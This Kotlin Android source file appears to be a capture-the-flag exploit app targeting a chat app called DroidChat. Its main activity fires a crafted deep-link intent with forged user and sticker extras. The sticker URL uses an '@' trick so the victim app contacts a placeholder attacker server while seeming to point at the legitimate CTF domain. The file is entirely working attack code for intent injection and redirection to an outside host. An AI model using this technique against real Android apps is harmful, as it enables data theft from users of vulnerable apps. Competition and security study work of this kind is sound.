package ru.superappstore.newapp

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        startActivity(Intent().apply {
            data = Uri.parse("droidchat://chat/-1234")
            putExtra("args", Bundle().apply {
                putBundle("_ChatActivityArguments__user", Bundle().apply {
                    putInt("_User__id", 11)
                    putString("_User__username", "get pwned")
                })
                putBundle("_ChatActivityArguments__pendingSticker", Bundle().apply {
                    putString("_Sticker__id", "owo")
                    putString("_Sticker__url", "https://droidchat-ab2f2aaa594034df.brics-ctf.ru@<YOUR_SERVER_HERE!>/")
                })
            })
        })
    }
}
